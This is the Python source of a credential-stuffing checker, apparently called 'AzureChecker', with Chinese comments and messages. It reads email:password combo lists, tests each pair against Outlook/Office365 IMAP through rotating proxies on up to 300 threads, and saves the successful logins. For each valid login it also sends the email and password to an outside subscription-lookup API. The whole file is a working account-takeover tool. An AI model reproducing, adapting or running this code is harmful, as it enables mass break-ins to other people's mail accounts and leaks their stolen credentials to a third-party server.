import NewImap
#from Auth import Auth
from ctypes import windll
from multiprocessing.dummy import Pool
from time import strftime, sleep
from yaml import safe_load
import os, socks, json, traceback
from colorama import Fore, init
from tkinter import filedialog
import tkinter
from random import choice
from threading import Thread
import requests, sys
import hashlib
import wmi

def preparations():
    global Checker
    global config
    default_config = "# 响应时间\ntimeout: 10\n# 线程\nthreads: 300\n# 保存无效的卡\nsave_bad: true\n# 输出无效的卡\nprint_bad: true\n# 智能跳过无用alt\nAutoBypass: true\n# 使用代理\nproxy: true\n# 代理类型 HTTPS|SOCKS4/5\nproxy_type: 'HTTPS'\n# 代理api\nproxy_api: false\n# 代理api地址\nproxy_api_url: 'https://proxy.com'\n# 刷新时间(秒/s)\nre_fresh: 100\n"
    while True:
        try:
            config = safe_load(open('config/config.yml', 'r', errors='ignore'))
            break
        except:
            if not os.path.exists('config'):
                os.mkdir('config')
            open('config/config.yml', 'w').write(default_config)
            sleep(2)

    class Checker:
        timeout = int(config['timeout'])
        threads = int(config['threads'])
        savebad = bool(config['save_bad'])
        print_bad = bool(config['print_bad'])
        autobypass = bool(config['AutoBypass'])
        proxy = bool(config['proxy'])
        proxy_type = str(config['proxy_type'])
        proxyapi = bool(config['proxy_api'])
        Url = str(config['proxy_api_url'])
        refresh = int(config['re_fresh'])


class MicroRes:
    hits = 0
    bad = 0


class MicrosoftMailChecker:

    def __init__(self):
        self.t = f'''{(Fore.LIGHTCYAN_EX)}Welcome Use AzureChecker!
{(Fore.RESET)}'''
        self.apiList = ['https://fucking/']
        print(self.t)
        #Auth().Verify()
        while True:
            try:
                file = filedialog.askopenfilename(initialdir=os.getcwd(), title='Select A Combo', filetypes=(('txt files', '*.txt'),
                                                                                                             ('all files', '*.*')))
                self.combolist = (open(file, 'r', encoding='utf-8', errors='ignore')).read().split('\n')
                break
            except:
                print(f'''{(Fore.LIGHTRED_EX)}你没有选择Combo''')
                continue

        if Checker.proxy:
            if not Checker.proxyapi:
                while True:
                    try:
                        filename = filedialog.askopenfilename(initialdir=os.getcwd(), title='Select A ProxyList', filetypes=(('txt files', '*.txt'),
                                                                                                                             ('all files', '*.*')))
                        self.proxylist = (open(filename, 'r', encoding='u8', errors='ignore')).read().split('\n')
                        break
                    except:
                        print(f'''{(Fore.LIGHTRED_EX)}你没有选择Proxoes!''')
                        continue

            else:
                try:
                    self.proxylist = (requests.get(url=Checker.Url)).text.split('\n')
                except:
                    print('获取代理失败!')
                    sleep(5)
                    exit()

        else:
            self.proxylist = []
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.savepath = f'''Hits/{unix}'''
        if not os.path.exists('Hits'):
            os.mkdir('Hits')
        if not os.path.exists(self.savepath):
            os.mkdir(self.savepath)
        os.system('cls')
        (Thread(target=self.title, daemon=True)).start()
        if Checker.proxyapi:
            (Thread(target=self.refresh, daemon=True)).start()
        pool = Pool(Checker.threads)
        res = pool.imap_unordered(func=self.CheckMail, iterable=self.combolist)
        for r in res:
            if r[0]:
                print(f'''{(Fore.LIGHTGREEN_EX)}[+] {(r[0])} | {(r[1])}''')
                try:
                    with open(f'''{(self.savepath)}/Hits.txt''', 'a+') as (f):
                        f.write(f'''{(r[0])} {(r[1])}
''')
                except:
                    print(f'''{(Fore.LIGHTCYAN_EX)}Failed To Save Hit:{(r[1])}''')

            else:
                if Checker.print_bad:
                    print(f'''{(Fore.LIGHTRED_EX)}[-] {(r[1])}''')
            if Checker.savebad:
                try:
                    with open(f'''{(self.savepath)}/Fail.txt''', 'a+') as (f):
                        f.write(f'''{(r[1])}
''')
                except:
                    print(f'''{(Fore.LIGHTMAGENTA_EX)}Failed To Save Fail:{(r[1])}''')

        pool.close()
        print(f'''{(Fore.MAGENTA)}Finished! Thanks For You Using FAMChecker!''')
        input()
        sys.exit()

    def CheckMail(self, line):
        while True:
            try:
                email, password = line.split(':')
                if Checker.proxy:
                    login = NewImap.IMAP4_SSL('outlook.office365.com', 993, timeout=Checker.timeout, proxytype=Checker.proxy_type.lower(), proxies=self.proxies())
                else:
                    login = NewImap.IMAP4_SSL('outlook.office365.com', 993, timeout=Checker.timeout)
                login.login(user=email, password=password)
                MicroRes.hits += 1
                res = self.SubCheck(email, password)
                if not res:
                    msg = 'Not Active'
                else:
                    if 'Error' in res:
                        msg = f'''Sub: {res}'''
                    else:
                        if res == 'None':
                            msg = f'''Sub: {res}'''
                        else:
                            msg = f'''Sub - {(res[0])}:{(res[1])} '''
                return [
                 line, msg]
            except (socks.ProxyError, socks.ProxyConnectionError):
                continue
            except Exception as e:
                try:
                    if 'LOGIN failed' in str(e):
                        MicroRes.bad += 1
                        return [
                         False, line]
                    with open('runerrorlog.log', 'a+') as (f):
                        traceback.print_exc(file=f)
                    continue
                finally:
                    e = None
                    del e

    def proxies(self):
        proxy = choice(self.proxylist)
        proxy = proxy.strip()
        return proxy

    def refresh(self):
        while True:
            sleep(Checker.refresh)
            try:
                self.proxylist = (requests.get(url=Checker.Url, timeout=Checker.timeout)).text.split('\n')
            except:
                print('更换失败!,重试中...')
                continue

    def SubCheck(self, email, pwd):
        while True:
            try:
                url = choice(self.apiList)
                res = requests.get(url + f'''api/subscriptions?email={email}&password={pwd}''').text
                if res == '[]':
                    return False
                res = res.replace('[', '')
                res = res.replace(']', '')
                if 'error' in res:
                    return 'Error'
                res = json.loads(res)
                if res == {}:
                    return 'None'
                return [res['name'], res['state']]
            except KeyError:
                return 'KError - Pls Contact Dev'
            except:
                with open('suberrorlog.log', 'a+') as (f):
                    traceback.print_exc(file=f)
                continue

    def title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(f'''Checking|Good:{(MicroRes.hits)}|Fail:{(MicroRes.bad)}|Checked {(MicroRes.hits + MicroRes.bad)} of {(len(self.combolist))}''')


root = tkinter.Tk()
root.withdraw()
init()
try:
    preparations()
except:
    print(f'''{(Fore.LIGHTRED_EX)}初始化失败!请尝试删除配置!''')
    sleep(5)
    exit()

MicrosoftMailChecker()
